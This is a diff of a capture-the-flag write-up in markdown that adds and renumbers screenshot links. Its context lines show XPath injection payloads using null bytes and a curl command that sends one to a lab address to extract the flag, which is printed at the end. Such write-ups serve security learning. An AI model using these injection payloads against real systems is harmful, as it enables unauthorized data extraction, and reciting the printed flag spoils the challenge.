@@ -30,6 +30,8 @@ Using crafted queries, the data printed can be controlled.
 * `' or 1]/../..//name\x00`
 * `' or 1]/../..//text()\x00`
 
+![](screenshots/3.png)
+
 The underelying xml structure and content can be slowly recovered with various queries or tools like `xcat`.
 
 A more simpler method is just query for the flag format.
@@ -38,7 +40,7 @@ A more simpler method is just query for the flag format.
 curl -s -X POST 'http://10.10.1.10:64234/index.php' --data-binary "input=$(printf %s "' or 1]/../..//*[text()[contains(.,'CQ24')]]"|jq -sRr @uri)%00"
 ```
 
-![](screenshots/3.png)
+![](screenshots/4.png)
 
 # Flag
 `CQ24{DonTHugMeIAmScared}`
